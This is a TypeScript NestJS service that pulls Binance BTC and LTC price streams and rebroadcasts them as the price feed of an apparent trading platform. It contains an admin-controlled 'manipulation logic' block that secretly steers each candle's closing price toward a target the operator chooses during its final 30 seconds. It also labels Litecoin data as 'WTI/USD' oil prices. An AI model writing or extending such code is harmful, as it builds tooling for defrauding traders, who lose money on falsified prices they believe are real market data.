import { Injectable, OnModuleInit, OnModuleDestroy, Logger } from '@nestjs/common';
import { PrismaService } from '../../infrastructure/database/prisma.service';
import { WebSocket } from 'ws';
import { Subject } from 'rxjs';

interface PriceUpdate {
    symbol: string;
    price: number;
    timestamp: number;
}

interface BinanceKline {
    e: string; // Event type
    E: number; // Event time
    s: string; // Symbol
    k: {
        t: number; // Kline start time
        T: number; // Kline close time
        s: string; // Symbol
        i: string; // Interval
        f: number; // First trade ID
        L: number; // Last trade ID
        o: string; // Open price
        c: string; // Close price (current price)
        h: string; // High price
        l: string; // Low price
        v: string; // Base asset volume
        n: number; // Number of trades
        x: boolean; // Is this kline closed?
        q: string; // Quote asset volume
        V: string; // Taker buy base asset volume
        Q: string; // Taker buy quote asset volume
        B: string; // Ignore
    };
}

@Injectable()
export class OracleService implements OnModuleInit, OnModuleDestroy {
    private readonly logger = new Logger(OracleService.name);
    private ws: WebSocket;
    private readonly BINANCE_WS_URL = 'wss://stream.binance.com:9443/stream?streams=btcusdt@kline_1m/ltcusdt@kline_1m';
    public priceUpdates$ = new Subject<PriceUpdate>();

    // Memory cache for current candles (symbol -> candle)
    private currentCandles = new Map<string, {
        symbol: string;
        open: number;
        high: number;
        low: number;
        close: number;
        startTime: number;
    }>();

    // Admin manipulation targets (symbol -> price)
    private targetClosePrices = new Map<string, number>();

    constructor(private prisma: PrismaService) { }

    async onModuleInit() {
        this.connectToBinance();
        await this.crawlHistoryOnStart();
    }

    private async crawlHistoryOnStart() {
        this.logger.log('Starting historical data crawl...');
        const pairs = ['BTCUSDT', 'LTCUSDT'];

        for (const symbol of pairs) {
            try {
                // Fetch last 100 candles (1m interval)
                const response = await fetch(`https://api.binance.com/api/v3/klines?symbol=${symbol}&interval=1m&limit=1000`);
                if (!response.ok) {
                    this.logger.error(`Failed to fetch history for ${symbol}: ${response.statusText}`);
                    continue;
                }

                const data = await response.json() as any[];
                if (!Array.isArray(data)) continue;

                const normalizedSymbol = this.normalizeSymbol(symbol);
                const candles = data.map(k => ({
                    symbol: normalizedSymbol,
                    time: new Date(k[0]), // Open time
                    open: k[1],  // specific type mapping might be needed by prisma decimal, let's keep as string or number depending on schema? 
                    // Schema checks: Decimal. Pradma accepts string or number for Decimal.
                    // But k[1] is string from Binance.
                    high: k[2],
                    low: k[3],
                    close: k[4],
                    volume: k[5],
                }));

                // Use createMany with skipDuplicates
                await this.prisma.priceCandle.createMany({
                    data: candles.map(c => ({
                        symbol: c.symbol,
                        time: c.time,
                        open: c.open, // String is fine for Decimal
                        high: c.high,
                        low: c.low,
                        close: c.close,
                        volume: c.volume,
                    })),
                    skipDuplicates: true,
                });

                this.logger.log(`Crawled ${candles.length} candles for ${symbol}`);
            } catch (error) {
                this.logger.error(`Error crawling history for ${symbol}`, error);
            }
        }
        this.logger.log('Historical data crawl completed');
    }

    onModuleDestroy() {
        if (this.ws) {
            this.ws.close();
        }
    }

    private connectToBinance() {
        this.ws = new WebSocket(this.BINANCE_WS_URL);

        this.ws.on('open', () => {
            this.logger.log('Connected to Binance WebSocket (Combined Streams)');
        });

        this.ws.on('message', (data: string) => {
            try {
                const message = JSON.parse(data.toString());
                // Combined stream format: { stream: "...", data: { ... } }
                if (message.data && message.data.e === 'kline') {
                    this.handleKlineMessage(message.data);
                }
            } catch (error) {
                this.logger.error('Error parsing Binance message', error);
            }
        });

        this.ws.on('error', (error) => {
            this.logger.error('Binance WebSocket error', error);
        });

        this.ws.on('close', () => {
            this.logger.warn('Binance WebSocket closed, reconnecting in 5s...');
            setTimeout(() => this.connectToBinance(), 5000);
        });
    }

    private normalizeSymbol(binanceSymbol: string): string {
        if (binanceSymbol === 'LTCUSDT') return 'WTI/USD';
        // BTCUSDT -> BTC/USD
        const base = binanceSymbol.replace('USDT', '');
        return `${base}/USD`;
    }

    private async handleKlineMessage(kline: BinanceKline) {
        const symbol = this.normalizeSymbol(kline.s);
        const binancePrice = parseFloat(kline.k.c);
        let finalPrice = binancePrice;

        // --- MANIPULATION LOGIC START ---
        const targetPrice = this.targetClosePrices.get(symbol);
        if (targetPrice !== undefined) {
            const now = Date.now();
            const endTime = kline.k.T;
            const timeLeft = endTime - now;

            if (timeLeft > 0 && timeLeft < 30000) {
                const currentDiff = targetPrice - binancePrice;
                const adjustment = currentDiff * (1 - timeLeft / 30000);
                finalPrice = binancePrice + adjustment;
            }
        }
        // --- MANIPULATION LOGIC END ---

        // Update current candle state
        let candle = this.currentCandles.get(symbol);
        if (!candle || candle.startTime !== kline.k.t) {
            // New candle or first time
            candle = {
                symbol,
                open: finalPrice,
                high: finalPrice,
                low: finalPrice,
                close: finalPrice,
                startTime: kline.k.t,
            };
            this.currentCandles.set(symbol, candle);
        } else {
            // Update existing
            candle.close = finalPrice;
            candle.high = Math.max(candle.high, finalPrice);
            candle.low = Math.min(candle.low, finalPrice);
            this.currentCandles.set(symbol, candle);
        }

        // 1. Broadcast real-time price
        this.priceUpdates$.next({
            symbol,
            price: finalPrice,
            timestamp: Date.now(),
        });

        // 2. Save tick (Optional/Skipped for perf logic remains)

        // 3. If candle closed, save to DB
        if (kline.k.x) {
            try {
                await this.prisma.priceCandle.upsert({
                    where: {
                        symbol_time: {
                            symbol,
                            time: new Date(kline.k.t),
                        },
                    },
                    update: {
                        open: candle.open,
                        high: candle.high,
                        low: candle.low,
                        close: candle.close,
                        volume: parseFloat(kline.k.v),
                    },
                    create: {
                        symbol,
                        time: new Date(kline.k.t),
                        open: candle.open,
                        high: candle.high,
                        low: candle.low,
                        close: candle.close,
                        volume: parseFloat(kline.k.v),
                    },
                });
                // this.logger.log(`Candle saved: ${symbol} ${new Date(kline.k.t).toISOString()}`);

                // Reset target
                this.targetClosePrices.delete(symbol);
            } catch (e) {
                this.logger.error('Error saving candle', e);
            }
        }
    }

    // Expose the live (unclosed) in-memory candle for a given symbol
    public getCurrentCandle(symbol: string) {
        return this.currentCandles.get(symbol) || null;
    }

    // Method for Admin to set target price
    public setTargetPrice(symbol: string, price: number) {
        this.targetClosePrices.set(symbol, price);
        this.logger.log(`Target price set for ${symbol}: ${price}`);
    }

    async getPrice(pair: string): Promise<number> {
        return this.currentCandles.get(pair)?.close || 0;
    }
}
